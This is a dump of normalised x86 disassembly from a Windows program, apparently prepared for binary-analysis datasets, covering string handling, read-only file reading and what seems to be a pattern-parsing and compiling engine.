mov eax [ rw-data ]
push esi
mov esi [ rw-data ]
cmp esi eax
je r-xdata
call sub_4b3220
xor eax eax
pop esi
retn
push edi
mov edi [ esp + 0xc ]
mov eax r--data
lea edx [ eax + 0x1 ]
mov eax r--data
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
mov ecx edi
call sub_401cc0
push 0xffffffff
push 0x0
push esi
mov ecx edi
call sub_4018c0
mov eax [ rw-data ]
add esi 0x20
cmp esi eax
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
mov ecx edi
call sub_401cc0
cmp esi [ rw-data ]
je r-xdata
pop edi
sub_4b3c20
mov al [ rw-data ]
test al al
jne r-xdata
push ebp
push esi
mov esi [ esp + 0xc ]
push edi
push esi
call sub_458010
mov edi eax
mov eax [ rw-data ]
add edi esi
mov esi [ rw-data ]
add esp 0x4
cmp esi eax
je r-xdata
call sub_4b3220
pop edi
pop esi
xor eax eax
pop ebp
retn
mov ebp [ lstrcmpiA@IAT ]
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
mov eax [ rw-data ]
add esi 0x20
cmp esi eax
jne r-xdata
mov eax [ esi + 0x1c ]
test [ eax + 0x24 ] 0x2
jne r-xdata
push edi
push eax
call ebp
test eax eax
jne r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov eax [ esi + 0x1c ]
pop edi
pop esi
pop ebp
retn
sub_4b3c90
mov eax [ esp + 0x8 ]
sub esp 0xa04
test eax eax
push ebp
push esi
push edi
je r-xdata
mov edi [ esp + 0xa14 ]
test edi edi
je r-xdata
mov ebp eax
mov eax [ esp + 0xa14 ]
test eax eax
je r-xdata
pop edi
pop esi
xor eax eax
pop ebp
add esp 0xa04
retn
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x80000000
push edi
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
xor edi edi
jmp r-xdata
push 0x200
push eax
jmp r-xdata
push 0x0
lea ecx [ esp + 0x10 ]
push ecx
push 0x800
lea edx [ esp + 0x21c ]
push edx
push esi
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
lea eax [ esp + 0x18 ]
push eax
call [ lstrcpynA@IAT ]
lea edi [ esp + 0x10 ]
test esi esi
je r-xdata
mov esi [ rw-data ]
mov eax [ rw-data ]
push ebx
xor ebx ebx
cmp esi eax
je r-xdata
call sub_4b3220
push 0x200
lea ebp [ esp + 0x214 ]
push edi
push esi
call [ CloseHandle@IAT ]
mov eax ebx
pop ebx
pop edi
pop esi
pop ebp
add esp 0xa04
retn
mov eax [ esi ]
test [ eax + 0x24 ] 0x1
je r-xdata
mov eax [ rw-data ]
add esi 0x4
cmp esi eax
jne r-xdata
push ebp
push edi
call [ eax + 0x30 ]
test eax eax
jne r-xdata
mov eax ebx
pop ebx
pop edi
pop esi
pop ebp
add esp 0xa04
retn
mov ebx [ esi ]
sub_4b3da0
mov al [ rw-data ]
test al al
jne r-xdata
push ebp
push esi
mov esi [ esp + 0xc ]
push edi
push esi
call sub_458010
mov edi eax
mov eax [ rw-data ]
add edi esi
mov esi [ rw-data ]
add esp 0x4
cmp esi eax
je r-xdata
call sub_4b3220
pop edi
pop esi
xor eax eax
pop ebp
retn
mov ebp [ lstrcmpiA@IAT ]
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
mov eax [ rw-data ]
add esi 0x20
cmp esi eax
jne r-xdata
mov eax [ esi + 0x1c ]
test [ eax + 0x24 ] 0x1
jne r-xdata
push edi
push eax
call ebp
test eax eax
jne r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov eax [ esi + 0x1c ]
pop edi
pop esi
pop ebp
retn
sub_4b3e10
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xa04
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
test esi esi
push edi
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov edi [ ebp + 0x1c ]
mov ecx [ ebp + 0x14 ]
push edi
mov edx 0x1
push edx
mov eax ebx
push ecx
push eax
call [ esi + 0x34 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0xc ]
push ebx
push eax
mov eax [ ebp + 0x18 ]
test eax eax
jg r-xdata
pop edi
pop esi
mov eax 0xfffffffe
pop ebx
mov esp ebp
pop ebp
retn
push 0x200
push eax
lea ecx [ esp + 0x18 ]
push ecx
call [ lstrcpynA@IAT ]
mov edi [ ebp + 0x1c ]
push edi
xor edx edx
push edx
xor ecx ecx
lea eax [ esp + 0x18 ]
push ecx
push eax
call [ esi + 0x34 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jl r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0xc ]
mov eax ecx
shr ecx 0x2
mov esi ebx
lea edi [ esp + 0x210 ]
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x210 ]
push ecx
push edx
jmp r-xdata
cmp [ ebp + 0x14 ] 0x800
jae r-xdata
call sub_4b3c90
mov esi eax
add esp 0x8
test esi esi
je r-xdata
sub_4b3ee0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xa04
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
test esi esi
push edi
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
mov ecx 0x1
jmp r-xdata
mov eax [ ebp + 0xc ]
push ebx
push eax
mov eax [ ebp + 0x18 ]
test eax eax
jg r-xdata
pop edi
pop esi
mov eax 0xfffffffe
pop ebx
mov esp ebp
pop ebp
retn
push 0x200
push eax
lea ecx [ esp + 0x18 ]
push ecx
call [ lstrcpynA@IAT ]
xor eax eax
lea ebx [ esp + 0x10 ]
xor ecx ecx
mov edx [ ebp + 0x24 ]
test edx edx
jne r-xdata
jl r-xdata
mov edi [ ebp + 0x28 ]
push edi
push edx
mov edx [ ebp + 0x20 ]
push edx
mov edx [ ebp + 0x1c ]
push edx
push ecx
push eax
push ebx
call [ esi + 0x38 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx sub_4b21f0
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0xc ]
mov eax ecx
shr ecx 0x2
mov esi ebx
lea edi [ esp + 0x210 ]
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x210 ]
push ecx
push edx
jmp r-xdata
cmp [ ebp + 0x14 ] 0x800
jae r-xdata
call sub_4b3c90
mov esi eax
add esp 0x8
test esi esi
je r-xdata
sub_4b3fb0
sub esp 0x200
push ebx
mov ebx [ esp + 0x208 ]
test ebx ebx
push esi
mov esi [ esp + 0x214 ]
push edi
mov edi [ esp + 0x214 ]
jne r-xdata
test esi esi
je r-xdata
push esi
push edi
call sub_4b3a50
mov ebx eax
add esp 0x8
test ebx ebx
je r-xdata
test edi edi
je r-xdata
mov ecx [ esp + 0x21c ]
mov eax esi
mov esi [ esp + 0x224 ]
push esi
mov edx 0x1
push edx
push ecx
push eax
call [ ebx + 0x40 ]
pop edi
pop esi
pop ebx
add esp 0x200
retn
pop edi
pop esi
mov eax 0xfffffffe
pop ebx
add esp 0x200
retn
push 0x200
push edi
lea eax [ esp + 0x14 ]
push eax
call [ lstrcpynA@IAT ]
mov esi [ esp + 0x224 ]
push esi
xor edx edx
push edx
xor ecx ecx
lea eax [ esp + 0x14 ]
push ecx
push eax
call [ ebx + 0x40 ]
pop edi
pop esi
pop ebx
add esp 0x200
retn
sub_4b4050
sub esp 0x200
push ebx
mov ebx [ esp + 0x208 ]
test ebx ebx
push esi
mov esi [ esp + 0x214 ]
push edi
mov edi [ esp + 0x214 ]
jne r-xdata
test esi esi
je r-xdata
push esi
push edi
call sub_4b3a50
mov ebx eax
add esp 0x8
test ebx ebx
je r-xdata
test edi edi
je r-xdata
mov edi [ esp + 0x21c ]
mov eax 0x1
jmp r-xdata
pop edi
pop esi
mov eax 0xfffffffe
pop ebx
add esp 0x200
retn
push 0x200
push edi
lea eax [ esp + 0x14 ]
push eax
call [ lstrcpynA@IAT ]
mov edi [ esp + 0x224 ]
lea esi [ esp + 0xc ]
xor eax eax
mov ecx [ esp + 0x22c ]
test ecx ecx
je r-xdata
mov ecx [ esp + 0x228 ]
test ecx ecx
je r-xdata
or eax 0x100
jmp r-xdata
mov edx [ esp + 0x230 ]
test edx edx
jne r-xdata
push ebp
mov ebp [ esp + 0x238 ]
push ebp
push edx
push eax
push ecx
push edi
push esi
call [ ebx + 0x48 ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x200
retn
mov edx sub_4b21f0
sub_4b4150
push edi
mov edi [ esp + 0x8 ]
test edi edi
jne r-xdata
push esi
push edi
call [ lstrlenA@IAT ]
inc eax
push eax
call j_sub_4b66db
mov esi eax
add esp 0x4
test esi esi
je r-xdata
xor eax eax
pop edi
retn
mov eax esi
pop esi
pop edi
retn
push edi
push esi
call [ lstrcpyA@IAT ]
sub_4b4190
sub esp 0xc
xor edx edx
cmp eax edx
push esi
mov esi ecx
jne r-xdata
inc esi
mov [ ebx + 0x1 ] dl
mov al [ esi ]
movsx ecx al
add ecx 0xffffffbc
cmp ecx 0x34
ja r-xdata
movsx eax [ esi + 0x1 ]
add eax 0xffffffbc
cmp eax 0x33
ja r-xdata
mov [ ebx ] al
movzx ecx [ ecx + lookup_table_4b4348 ]
jmp [ ecx * 4 + jump_table_4b431c ]
movzx eax [ eax + lookup_table_4b42e8 ]
jmp [ eax * 4 + jump_table_4b42e0 ]
lea eax [ esi + 0x1 ]
mov [ ebx ] 0xd
pop esi
add esp 0xc
retn
lea eax [ esi + 0x1 ]
mov [ ebx ] 0xa
pop esi
add esp 0xc
retn
lea eax [ esi + 0x1 ]
mov [ ebx ] 0x9
pop esi
add esp 0xc
retn
push r--data
push ebx
call [ lstrcpyA@IAT ]
lea eax [ esi + 0x1 ]
pop esi
add esp 0xc
retn
push r--data
push ebx
call [ lstrcpyA@IAT ]
lea eax [ esi + 0x1 ]
pop esi
add esp 0xc
retn
push r--data
push ebx
call [ lstrcpyA@IAT ]
lea eax [ esi + 0x1 ]
pop esi
add esp 0xc
retn
push r--data
push ebx
call [ lstrcpyA@IAT ]
lea eax [ esi + 0x1 ]
pop esi
add esp 0xc
retn
push r--data
push ebx
call [ lstrcpyA@IAT ]
lea eax [ esi + 0x1 ]
pop esi
add esp 0xc
retn
push r--data
push ebx
call [ lstrcpyA@IAT ]
lea eax [ esi + 0x1 ]
pop esi
add esp 0xc
retn
mov al [ esi + 0x1 ]
inc esi
cmp al dl
je r-xdata
mov cl [ esi ]
mov [ ebx ] cl
mov al [ esi + 0x1 ]
mov [ ebx + 0x1 ] al
lea eax [ esi + 0x2 ]
mov [ ebx + 0x2 ] dl
pop esi
add esp 0xc
retn
lea eax [ esi + 0x1 ]
pop esi
add esp 0xc
retn
push edi
mov edi esi
cmp al 0x41
jl r-xdata
cmp al 0x39
jle r-xdata
cmp al 0x61
jl r-xdata
cmp al 0x46
jle r-xdata
inc edi
inc edx
cmp edx 0x2
jl r-xdata
mov edx edi
sub edx esi
inc edx
push edx
lea eax [ esp + 0xc ]
push esi
push eax
call sub_4b5630
lea ecx [ esp + 0x14 ]
push ecx
call sub_4b56c0
add esp 0x10
lea esi [ edi - 0x1 ]
pop edi
cmp al 0x66
jg r-xdata
mov al [ edi ]
cmp al 0x30
jl r-xdata
sub_4b4380
sub esp 0x100
push esi
mov esi eax
push edi
mov [ esi + 0x8 ] 0x0
mov [ esi + 0x9 ] 0x0
mov [ esi + 0x4 ] 0x0
mov edi 0x1
mov edi edi
pop edi
mov [ esi + 0x4 ] 0x14
pop esi
add esp 0x100
retn
mov ecx [ edi * 4 + rw-data ]
push ecx
call [ lstrlenA@IAT ]
test eax eax
je r-xdata
inc edi
cmp edi 0x14
jl r-xdata
mov edx [ edi * 4 + rw-data ]
push eax
mov eax [ esi + 0xc ]
push edx
push eax
call sub_4b5670
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
cmp [ eax ] 0x0
je r-xdata
jmp r-xdata
mov [ esi + 0x4 ] edi
mov ecx [ esi + 0x4 ]
mov edx [ ecx * 4 + rw-data ]
push ebx
push ebp
mov ebp [ esi + 0xc ]
push edx
call [ lstrlenA@IAT ]
mov edx [ esi + 0xc ]
add edx eax
mov eax [ esi + 0x4 ]
cmp eax 0x13
mov [ esi + 0xc ] edx
mov edi edx
ja r-xdata
pop ebp
pop ebx
pop edi
pop esi
add esp 0x100
retn
movzx eax [ eax + lookup_table_4b46c0 ]
jmp [ eax * 4 + jump_table_4b46a0 ]
mov cl [ ebp ]
xor edx edx
mov [ esi + 0x8 ] cl
mov dl [ ebp ]
push edx
call [ IsDBCSLeadByte@IAT ]
test eax eax
je r-xdata
mov [ esi + 0x4 ] 0xe
push r--data
add esi 0x10
push esi
call [ lstrcpyA@IAT ]
pop ebp
pop ebx
pop edi
pop esi
add esp 0x100
retn
mov dl [ ebp ]
pop ebp
pop ebx
pop edi
mov [ esi + 0x8 ] dl
pop esi
add esp 0x100
retn
mov al [ ebp ]
pop ebp
pop ebx
pop edi
mov [ esi + 0x8 ] al
pop esi
add esp 0x100
retn
cmp [ edi ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax [ esi + 0xc ]
mov cl [ eax ]
pop ebp
pop ebx
inc eax
pop edi
mov [ esi + 0x9 ] cl
mov [ esi + 0xc ] eax
pop esi
add esp 0x100
retn
cmp [ esi + 0x4 ] 0xb
jne r-xdata
lea ebx [ esi + 0x110 ]
lea ebp [ esi + 0x114 ]
lea ecx [ edi + 0x1 ]
mov [ ebx ] 0x0
mov [ ebp ] 0x0
mov [ esi + 0xc ] ecx
mov al [ edi ]
test al al
mov edx ebx
je r-xdata
cmp [ esi + 0x4 ] 0xe
je r-xdata
lea eax [ edi + 0x1 ]
mov [ esi + 0xc ] eax
mov ecx [ rw-data ]
mov al [ ecx ]
mov cl [ edi ]
xor ebp ebp
cmp cl al
jne r-xdata
mov [ esi + 0x4 ] 0x14
lea ebx [ esi + 0x10 ]
mov eax 0x1
mov ecx ebp
call sub_4b4190
push ebx
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] 0xe
call [ lstrlenA@IAT ]
cmp eax 0x1
jne r-xdata
mov eax [ esi + 0xc ]
cmp [ eax ] 0x3f
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax ]
cmp [ edi ] al
jne r-xdata
mov [ esi + 0x10 ] al
mov edi [ esi + 0xc ]
lea edx [ edi + 0x1 ]
mov ebp 0x1
mov [ esi + 0xc ] edx
mov al [ ebx ]
pop ebp
pop ebx
pop edi
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] al
pop esi
add esp 0x100
retn
pop ebp
pop ebx
inc eax
pop edi
mov [ esi + 0x4 ] 0x6
mov [ esi + 0xc ] eax
pop esi
add esp 0x100
retn
mov ecx [ rw-data ]
cmp al [ ecx ]
je r-xdata
mov al [ edi ]
test al al
je r-xdata
mov ecx [ esi + 0xc ]
mov dl [ ecx ]
mov ecx [ rw-data ]
cmp dl [ ecx ]
jne r-xdata
cmp edx ebx
jne r-xdata
mov ecx [ rw-data ]
cmp al [ ecx ]
jne r-xdata
mov edx [ rw-data ]
cmp al [ edx ]
je r-xdata
mov [ esi + ebp + 0x10 ] al
mov ecx [ esi + 0xc ]
inc ebp
inc ecx
mov [ esi + 0xc ] ecx
mov edx [ rw-data ]
mov al [ edx ]
mov [ esi + ebp + 0x10 ] al
mov edi [ esi + 0xc ]
lea ecx [ edi + 0x1 ]
inc ebp
mov [ esi + 0xc ] ecx
mov [ esi + 0x4 ] 0xb
mov edx [ ebx ]
mov [ ebp ] edx
cmp al 0x30
jl r-xdata
mov edx ebp
jmp r-xdata
mov [ esi + ebp + 0x10 ] 0x0
mov [ esi + 0x4 ] 0xe
mov ecx [ rw-data ]
cmp al [ ecx ]
jne r-xdata
mov eax [ esi + 0xc ]
lea ecx [ eax + 0x1 ]
mov [ esi + 0xc ] ecx
mov al [ eax ]
test al al
jne r-xdata
cmp al 0x39
jg r-xdata
push eax
call [ IsDBCSLeadByte@IAT ]
cmp eax 0x1
jne r-xdata
xor eax eax
lea ebx [ esp + 0x10 ]
mov ecx edi
call sub_4b4190
lea edx [ esp + 0x10 ]
mov [ esi + 0xc ] eax
push edx
lea eax [ esi + ebp + 0x10 ]
push eax
call [ lstrcpyA@IAT ]
lea ecx [ esp + 0x10 ]
push ecx
call [ lstrlenA@IAT ]
add ebp eax
jmp r-xdata
jmp r-xdata
mov ecx [ edx ]
movsx eax al
lea ecx [ ecx + ecx * 4 ]
lea ecx [ eax + ecx * 2 - 0x30 ]
mov [ edx ] ecx
mov cl [ edi ]
mov [ esi + ebp + 0x10 ] cl
inc ebp
mov dl [ edi ]
mov [ esi + ebp + 0x10 ] dl
mov edi [ esi + 0xc ]
lea eax [ edi + 0x1 ]
inc ebp
mov [ esi + 0xc ] eax
mov edi [ esi + 0xc ]
lea edx [ edi + 0x1 ]
mov [ esi + 0xc ] edx
mov al [ edi ]
test al al
jne r-xdata
jmp r-xdata
sub_4b46e0
push 0xc
call sub_4b4120
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0xc ]
mov [ eax ] ecx
mov ecx [ esp + 0x10 ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
retn
sub_4b4710
push esi
mov esi [ esp + 0xc ]
test esi esi
jne r-xdata
mov eax [ esi ]
cmp eax 0x7
push edi
ja r-xdata
xor eax eax
pop esi
retn
mov ecx [ esp + 0xc ]
push 0x0
push 0x0
push eax
push ecx
call sub_4b46e0
add esp 0x10
mov edi eax
pop edi
pop esi
retn
jmp [ eax * 4 + jump_table_4b47ec ]
mov eax [ esi + 0x8 ]
mov edi [ esp + 0xc ]
push eax
push edi
call sub_4b4710
mov ecx [ esi + 0x4 ]
add esp 0x8
push eax
push ecx
push edi
call sub_4b4710
mov edx [ esi ]
add esp 0x8
push eax
push edx
push edi
call sub_4b46e0
add esp 0x10
mov edi eax
pop edi
pop esi
retn
mov eax [ esi + 0x4 ]
mov edi [ esp + 0xc ]
push 0x0
push eax
push edi
call sub_4b4710
mov ecx [ esi ]
add esp 0x8
push eax
push ecx
push edi
call sub_4b46e0
add esp 0x10
mov edi eax
pop edi
pop esi
retn
mov edx [ esp + 0xc ]
push 0x0
push 0x0
push 0x0
push edx
call sub_4b46e0
mov edi eax
mov al [ esi + 0x4 ]
mov [ edi + 0x4 ] al
mov cl [ esi + 0x5 ]
add esp 0x10
mov [ edi + 0x5 ] cl
mov eax edi
pop edi
pop esi
retn
mov edx [ esp + 0xc ]
push 0x0
push 0x0
push 0x3
push edx
call sub_4b46e0
mov edi eax
mov eax [ esi + 0x4 ]
push eax
call sub_4b4150
add esp 0x14
mov [ edi + 0x4 ] eax
mov eax edi
pop edi
pop esi
retn
sub_4b4810
mov eax [ esi + 0x4 ]
push edi
xor edi edi
cmp eax 0x12
ja r-xdata
mov eax edi
pop edi
retn
movzx eax [ eax + lookup_table_4b497c ]
jmp [ eax * 4 + jump_table_4b4960 ]
push 0x0
push 0x0
push 0x0
push esi
call sub_4b46e0
mov cl [ esi + 0x8 ]
mov edi eax
mov [ edi + 0x4 ] cl
mov dl [ esi + 0x9 ]
add esp 0x10
mov eax esi
mov [ edi + 0x5 ] dl
call sub_4b4380
mov eax edi
pop edi
retn
push 0x0
push 0x0
push 0x1
push esi
call sub_4b46e0
mov edi eax
mov al [ esi + 0x8 ]
mov [ edi + 0x4 ] al
add esp 0x10
mov eax esi
call sub_4b4380
mov eax edi
pop edi
retn
push 0x0
push 0x0
push 0x2
push esi
call sub_4b46e0
mov cl [ esi + 0x8 ]
mov edi eax
add esp 0x10
mov eax esi
mov [ edi + 0x4 ] cl
call sub_4b4380
mov eax edi
pop edi
retn
push 0x0
push 0x0
push 0x3
push esi
call sub_4b46e0
lea edx [ esi + 0x10 ]
push edx
mov edi eax
call sub_4b4150
mov [ edi + 0x4 ] eax
add esp 0x14
mov eax esi
call sub_4b4380
mov eax edi
pop edi
retn
mov edx [ esi + 0x118 ]
push ebx
push 0x0
push 0x0
inc edx
push 0xa
push esi
mov [ esi + 0x118 ] edx
call sub_4b46e0
push 0x0
push 0x0
mov edi eax
mov eax [ esi + 0x118 ]
push 0xb
push esi
mov [ edi + 0x4 ] eax
call sub_4b46e0
mov ecx [ esi + 0x118 ]
mov ebx eax
add esp 0x20
mov eax esi
mov [ ebx + 0x4 ] ecx
call sub_4b4380
push ebx
push esi
call sub_4b5570
add esp 0x4
push eax
push 0x4
push esi
call sub_4b46e0
push eax
push edi
push 0x4
push esi
call sub_4b46e0
mov edi eax
add esp 0x20
mov eax esi
call sub_4b4380
pop ebx
mov eax edi
pop edi
retn
mov eax esi
call sub_4b4380
push 0x0
push esi
call sub_4b5570
add esp 0x4
push eax
push 0x6
push esi
call sub_4b46e0
mov edi eax
add esp 0x10
mov eax esi
call sub_4b4380
sub_4b4990
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
add ecx 0xfffffffd
cmp ecx 0x5
ja r-xdata
lea ecx [ esp + 0x4 ]
push ecx
call sub_4b4130
pop ecx
jmp [ ecx * 4 + jump_table_4b4a00 ]
mov eax [ eax + 0x8 ]
push eax
call sub_4b4990
mov ecx [ esp + 0x8 ]
mov [ ecx + 0x8 ] 0x0
mov eax [ esp + 0x8 ]
add esp 0x4
mov edx [ eax + 0x4 ]
push edx
call sub_4b4990
mov eax [ esp + 0x8 ]
add esp 0x4
lea ecx [ esp + 0x4 ]
push ecx
mov [ eax + 0x4 ] 0x0
call sub_4b4130
pop ecx
retn
add eax 0x4
push eax
call sub_4b4130
add esp 0x4
sub_4b4a20
push 0x14
call sub_4b4120
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] edx
mov [ eax + 0xc ] ecx
mov edx [ edi ]
mov ecx [ edx + esi * 4 ]
mov [ eax + 0x10 ] ecx
mov edx [ edi ]
mov [ edx + esi * 4 ] eax
retn
retn
sub_4b4a60
push ebx
mov ebx [ esp + 0xc ]
test ebx ebx
je r-xdata
pop ebx
retn
push ebp
push esi
mov esi [ esp + 0x18 ]
push edi
mov edi [ esp + 0x14 ]
jmp r-xdata
mov eax [ ebx ]
cmp eax 0xb
ja r-xdata
pop edi
pop esi
pop ebp
jmp [ eax * 4 + jump_table_4b4c3c ]
mov eax [ esp + 0x20 ]
mov ecx [ ebx + 0x4 ]
push eax
push esi
push ecx
push edi
call sub_4b4a60
mov ebx [ ebx + 0x8 ]
add esp 0x10
jmp r-xdata
mov ebp [ edi + 0xc ]
lea edx [ ebp + 0x2 ]
mov [ edi + 0xc ] edx
mov eax [ ebx ]
push eax
push 0xffffffff
push ebp
call sub_4b4a20
mov ecx [ ebx ]
push ecx
push 0xffffffff
push ebp
lea esi [ ebp + 0x1 ]
call sub_4b4a20
mov edx [ ebx ]
mov eax [ esp + 0x38 ]
push edx
push 0xffffffff
push eax
mov esi ebp
call sub_4b4a20
lea eax [ ebp + 0x1 ]
add esp 0x24
mov [ esp + 0x20 ] eax
jmp r-xdata
mov ebp [ edi + 0xc ]
lea ecx [ ebp + 0x1 ]
push ebp
mov [ edi + 0xc ] ecx
mov edx [ ebx + 0x4 ]
push esi
push edx
push edi
call sub_4b4a60
mov ebx [ ebx + 0x8 ]
add esp 0x10
jmp r-xdata
mov ebp [ edi + 0xc ]
lea eax [ ebp + 0x1 ]
mov [ edi + 0xc ] eax
mov ecx [ ebx ]
push ecx
push 0xffffffff
push ebp
call sub_4b4a20
add esp 0xc
mov edx [ ebx ]
mov eax [ esp + 0x20 ]
push edx
push 0x0
push eax
call sub_4b4a20
add esp 0xc
test eax eax
je r-xdata
cmp esi [ edi + 0x4 ]
jne r-xdata
mov eax [ ebx ]
mov ecx [ esp + 0x20 ]
push eax
push 0xffffffff
push ecx
call sub_4b4a20
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ esp + 0x20 ]
cmp eax [ edi + 0x8 ]
jne r-xdata
mov eax [ ebx ]
mov ecx [ esp + 0x20 ]
push eax
push 0x0
push ecx
call sub_4b4a20
mov esi eax
add esp 0xc
test esi esi
je r-xdata
mov eax [ ebx ]
mov ecx [ esp + 0x20 ]
push eax
push 0xffffffff
push ecx
call sub_4b4a20
add esp 0xc
test eax eax
je r-xdata
mov ebp [ edi + 0xc ]
lea edx [ ebp + 0x2 ]
mov [ edi + 0xc ] edx
mov eax [ ebx ]
push eax
push 0xffffffff
push ebp
call sub_4b4a20
mov ecx [ ebx + 0x4 ]
lea esi [ ebp + 0x1 ]
push esi
push ebp
push ecx
push edi
call sub_4b4a60
mov edx [ ebx ]
push edx
push 0xffffffff
push ebp
call sub_4b4a20
mov eax [ ebx ]
mov ecx [ esp + 0x48 ]
push eax
push 0xffffffff
push ecx
mov esi ebp
call sub_4b4a20
add esp 0x34
test ebx ebx
jne r-xdata
mov ebx [ ebx + 0x4 ]
mov esi ebp
pop edi
pop esi
pop ebp
pop ebx
retn
mov cl [ ebx + 0x4 ]
pop edi
pop esi
mov [ eax + 0x4 ] cl
mov dl [ ebx + 0x5 ]
pop ebp
mov [ eax + 0x5 ] dl
pop ebx
retn
mov [ edi + 0x14 ] 0x1
mov [ edi + 0x18 ] 0x1
mov edx [ ebx ]
push edx
push 0xffffffff
push eax
call sub_4b4a20
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
retn
mov edx [ ebx + 0x4 ]
push edx
call sub_4b4150
add esp 0x4
pop edi
mov [ esi + 0x4 ] eax
pop esi
pop ebp
pop ebx
retn
mov edx [ ebx + 0x4 ]
pop edi
pop esi
pop ebp
mov [ eax + 0x4 ] edx
pop ebx
retn
sub_4b4c70
push esi
push edi
mov edi [ esp + 0xc ]
xor esi esi
test edi edi
jne r-xdata
mov eax [ edi ]
add eax 0xfffffffc
cmp eax 0x4
ja r-xdata
pop edi
xor eax eax
pop esi
retn
pop edi
mov eax esi
pop esi
retn
jmp [ eax * 4 + jump_table_4b4d14 ]
mov eax [ edi + 0x8 ]
push eax
call sub_4b4c70
mov ecx [ edi + 0x4 ]
push ecx
mov esi eax
call sub_4b4c70
add esp 0x8
add esi eax
pop edi
mov eax esi
pop esi
retn
mov edx [ edi + 0x4 ]
push edx
call sub_4b4c70
add esp 0x4
mov esi eax
add esi 0x2
pop edi
mov eax esi
pop esi
retn
mov eax [ edi + 0x4 ]
push eax
call sub_4b4c70
add esp 0x4
mov esi eax
add esi 0x2
pop edi
mov eax esi
pop esi
retn
mov ecx [ edi + 0x8 ]
push ecx
call sub_4b4c70
mov edx [ edi + 0x4 ]
push edx
mov esi eax
call sub_4b4c70
add esp 0x8
lea esi [ esi + eax + 0x1 ]
pop edi
mov eax esi
pop esi
retn
mov eax [ edi + 0x4 ]
push eax
call sub_4b4c70
mov esi eax
add esp 0x4
inc esi
sub_4b4d30
push esi
push 0x1c
call sub_4b4120
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
mov eax [ edi ]
push eax
call sub_4b4c70
lea ecx [ eax * 4 + 0x8 ]
push ecx
call sub_4b4120
mov [ esi ] eax
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x1
mov [ esi + 0xc ] 0x2
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x18 ] 0x0
mov edx [ edi + 0x118 ]
inc edx
push 0x1
mov [ esi + 0x10 ] edx
mov eax [ edi ]
push 0x0
push eax
push esi
call sub_4b4a60
add esp 0x18
mov eax esi
pop esi
retn
pop esi
retn
sub_4b4da0
push ecx
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0xc ]
push edi
xor edi edi
test ecx ecx
jle r-xdata
push eax
call sub_4b4130
lea eax [ esp + 0x10 ]
push eax
call sub_4b4130
add esp 0x8
pop edi
pop ecx
retn
push esi
mov ecx [ eax + 0xc ]
inc edi
cmp edi ecx
jl r-xdata
lea esp [ esp ]
mov ecx [ eax ]
mov esi [ ecx + edi * 4 ]
test esi esi
je r-xdata
pop esi
lea edx [ esp + 0x8 ]
push edx
call sub_4b4130
add esp 0x4
test esi esi
jne r-xdata
add eax 0x4
push eax
call sub_4b4130
add esp 0x4
mov eax esi
mov [ esp + 0x8 ] eax
cmp [ eax ] 0x3
mov esi [ esi + 0x10 ]
jne r-xdata
mov eax [ esp + 0x10 ]
sub_4b4e10
sub esp 0x104
mov edx [ rw-data ]
push ebx
mov bl [ edx ]
push esi
mov esi [ esp + 0x110 ]
mov cl [ esi ]
xor eax eax
cmp cl bl
mov [ esp + 0x8 ] eax
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
mov [ esp + 0x8 ] 0x1
inc esi
mov ecx [ esp + 0x8 ]
test ecx ecx
pop esi
pop ebx
je r-xdata
push ebp
mov ebp [ IsDBCSLeadByte@IAT ]
push edi
mov edi [ esp + 0x11c ]
add esp 0x104
retn
xor edx edx
test eax eax
sete dl
mov eax edx
pop edi
